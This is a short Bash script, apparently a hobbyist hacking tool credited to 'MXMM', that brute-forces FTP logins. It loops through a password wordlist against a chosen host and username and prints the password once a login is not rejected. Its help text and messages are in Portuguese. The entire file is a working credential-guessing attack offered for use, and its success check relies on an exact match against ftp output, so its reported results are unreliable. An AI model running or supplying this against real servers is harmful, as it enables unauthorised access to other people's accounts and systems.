#!/bin/bash

function bftp {

comp=$(ftp -n "$1" <<_CONEXAO
quote USER $2
quote PASS $3
quit
_CONEXAO
)

if [ "$comp" = "Login incorrect." ]
	then
		return 1
	else
		return 0
fi

}

function ajuda {
b="\nFTP BRUTE-FORCE BY MXMM\n\n
Modo de Uso:\n\n
-t <host|ip>\n
-w <wordlist>\n
-u <usuario>\n\n
Exemplo: `basename $0` -t 192.168.0.1 -w /tmp/wordlist.txt -u admin\n
"
echo -e $b
exit 1
}

[ "$1" ] || ajuda

while getopts t:w:u: OPT;
 do
	case "$OPT" in
		"t") host="${OPTARG}" ;;
		"w") wordlist="${OPTARG}" ;;
		"u") usuario="${OPTARG}" ;;
		"?") ajuda ;;
	esac
done

[ $host ] || ajuda;
[ $wordlist ] || ajuda;
[ $usuario ] || ajuda;

echo -e "\n[][][][][][][] Atacando [][][][][][][]\n\n Alvo => $host\n Usuario => $usuario\n Wordlist => `wc -l $wordlist | awk '{print $1}'` palavras para testar\n\n[][][][][][][][][][][][][][][][][][][]\n\n"

for pass in `cat $wordlist`
 do
 	echo -e "\033[1;34m[*]\033[0m Testando => $pass"
	a=$(bftp $host $usuario $pass)
	b=$(echo $?)
	if [ "$b" = "1" ]
	then
		echo -e "\033[1;31m[-]\033[0m ERRO"
	else
		echo -e "\n\033[40;1;37m[+] P4s5W0rd Cr4ck3d: $pass\033[0m\n"
		break
	fi
done
